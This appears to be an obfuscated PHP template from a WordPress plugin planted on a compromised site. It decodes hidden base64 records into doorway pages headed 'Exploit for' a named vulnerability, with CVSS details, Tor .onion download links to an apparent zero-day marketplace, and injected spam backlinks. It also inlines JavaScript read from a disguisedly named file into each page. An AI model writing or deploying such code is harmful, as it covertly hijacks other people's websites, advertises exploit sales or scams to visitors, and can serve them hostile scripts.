<?php

function nkywbypyg($jWr7Fv) {
    $qb55110j = 0;
    $wGz0EEr = strlen($jWr7Fv);
    for ($i = 0; $i < $wGz0EEr; $i++) $qb55110j += ord($jWr7Fv[$i]);
    return $qb55110j;
}

$pVAGIdE = intval(get_query_var('fypwvme'));

if ($pVAGIdE < 1 || $pVAGIdE > 1032) return;
$q3bto2rU = file(plugin_dir_path(__FILE__).'hidden-translation.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$vyy36cvS = explode(';', base64_decode($q3bto2rU[$pVAGIdE]));
if (count($vyy36cvS) < 2) return;
$o4BuxnTAvo = $vyy36cvS[0];
$uWfSGL = nkywbypyg($o4BuxnTAvo);
//$l9DlRg = $o4BuxnTAvo . ' POC (Proof-of-Concept)';
$l9DlRg = 'Exploit for ' . $o4BuxnTAvo;
$csTio  = $vyy36cvS[1];
$xtpYT = $vyy36cvS[2];
$dJuF1 = $vyy36cvS[3];
$nQTYxY3Cq  = $vyy36cvS[4];
set_query_var('uloyvpmd', $l9DlRg);

$qexajw30s = '';
$xlPyUf = plugin_dir_path(__FILE__).'click-react.php';
if (is_file($xlPyUf)) {
	$v0gsPZnu = file($xlPyUf, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($v0gsPZnu);
	shuffle($v0gsPZnu);
	$xdsp7 = mt_rand(2, 5);
	if (count($v0gsPZnu) > $xdsp7) {
		for ($tse4SQJfxC = 0; $tse4SQJfxC < $xdsp7; $tse4SQJfxC++) {
			$kjSPslLXg5 = base64_decode(array_shift($v0gsPZnu));
			$qexajw30s .= '<p><a href="'.$kjSPslLXg5.'">'.$kjSPslLXg5.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $l9DlRg; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $nQTYxY3Cq . "</p>\n";
				if (strlen($csTio) > 0) echo "<p><strong>Published: </strong>" . $csTio . "</p>\n";
				if (strlen($xtpYT) > 0) echo "<p><strong>CVSS: </strong>" . $xtpYT . "</p>\n";
				if (strlen($dJuF1) > 0) echo "<p><strong>CVSS Vector: </strong>" . $dJuF1 . "</p>\n";
				?>
				<p><strong>Download <?php echo $l9DlRg; ?> here:</strong></p>
				
				<div class="link-grid">
					<div class="link-box">
						<input type="text" id="link1" value="http://zeroday4n6aaxjruc5jgvulkdgy4mkioom5g6q7l3nz475a62vmamiyd.onion/exploit-for-<?php echo str_replace(' ', '-', strtolower($o4BuxnTAvo)) . '.' . $uWfSGL; ?>/" readonly>
						<button onclick="copyLink('link1')">
							<svg class="icon" viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-2 16H7v-2h10v2zm0-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>
							Copy
						</button>
					</div>
				</div>

				<p><strong>Tip:</strong> Download official Tor Browser at https://www.torproject.org/download/ to access .onion links.</p>

				<p>Check my portfolio here:</p>

				<div class="link-grid">
					<div class="link-box">
						<input type="text" id="link2" value="http://zeroday4n6aaxjruc5jgvulkdgy4mkioom5g6q7l3nz475a62vmamiyd.onion/members/tlncglobal.344/" readonly>
						<button onclick="copyLink('link2')">
							<svg class="icon" viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-2 16H7v-2h10v2zm0-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>
							Copy
						</button>
					</div>
				</div>

				<?php
				echo $qexajw30s;
				?>


<script>
function copyLink(id) {
	const input = document.getElementById(id);
	input.select();
	document.execCommand('copy');
	const btn = input.nextElementSibling;
	btn.innerHTML = '<svg class="icon" viewBox="0 0 24 24"><path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg> Copied!';
	btn.style.background = '#ff4500';
	setTimeout(() => {
		btn.innerHTML = '<svg class="icon" viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-2 16H7v-2h10v2zm0-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg> Copy';
		btn.style.background = '#2c2c2c';
	}, 2000);
}
</script>

<style>
.link-grid { display: grid; gap: 30px; margin: 40px 0; }
.link-box { background: #F9FAFC; padding: 25px; border-radius: 12px; display: flex; align-items: center; gap: 25px; transition: box-shadow 0.3s ease; }
.link-box:hover { box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); }
.link-box input { width: 70%; padding: 15px; border: 2px solid #2c2c2c; border-radius: 10px; font-size: 17px; }
.link-box button { background: #2c2c2c; color: white; padding: 0 35px 15px; border: none; border-radius: 10px; cursor: pointer; display: flex; align-items: center; transition: background 0.3s, transform 0.3s; }
.link-box button:hover { background: #ff4500; transform: scale(1.05); }
</style>


			</div>
		</article>
	</main>
</div>

<?php
$daaCUB3Vu = plugin_dir_path(__FILE__) . 'conditional-comment.js';
if (is_file($daaCUB3Vu)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($daaCUB3Vu);
	echo '</script>';
}
get_footer();
?>
